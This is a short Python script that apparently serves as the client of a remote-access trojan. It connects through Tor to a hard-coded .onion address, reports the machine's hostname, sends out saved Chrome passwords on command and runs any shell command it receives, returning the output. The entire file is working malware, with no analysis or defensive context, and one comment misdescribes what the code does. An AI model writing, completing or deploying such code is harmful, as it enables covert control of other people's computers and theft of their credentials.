import socket, os, subprocess, attack, socks

# Set up a socket to connect to the Tor SOCKS proxy
socks.setdefaultproxy(socks.SOCKS5, "127.0.0.1", 9150)
s = socks.socksocket()
s.connect(("6c26pxtghczwla2n6bmceyxn2f5w2uutsuh2wzcgefckflrdgoqkmwqd.onion",80))
# Send a command to the SOCKS proxy to create a new circuit
s.send(socket.gethostname().encode())
response = s.recv(4069)

def hearingLoop():
    # Start the chat loop
    while True:
        # Wait for incoming messages
        try:
            message = s.recv(4069).decode()
            print(message)
            if message == "":
                continue
            if message == "passwords":
                s.send(str(attack.getChromePasswords()).encode())
            #rce
            if(message.startswith("RUN: ")):
                command = message[5:]
                splited_command = command.split()
                output = "ERR"
                if splited_command[0].lower() == "cd":
                    # cd command, change directory
                    try:
                        os.chdir(' '.join(splited_command[1:]))
                    except FileNotFoundError as e:
                        # if there is an error, set as the output
                        output = str(e)
                    else:
                        # if operation is successful, empty message
                        output = ""
                else:
                    # execute the command and retrieve the results
                    output = subprocess.getoutput(command)
                s.send(("Output: "+output).encode())
        except socket.timeout:
            pass

def sendMessage(message):
    s.send(message.encode('ascii'))

hearingLoop()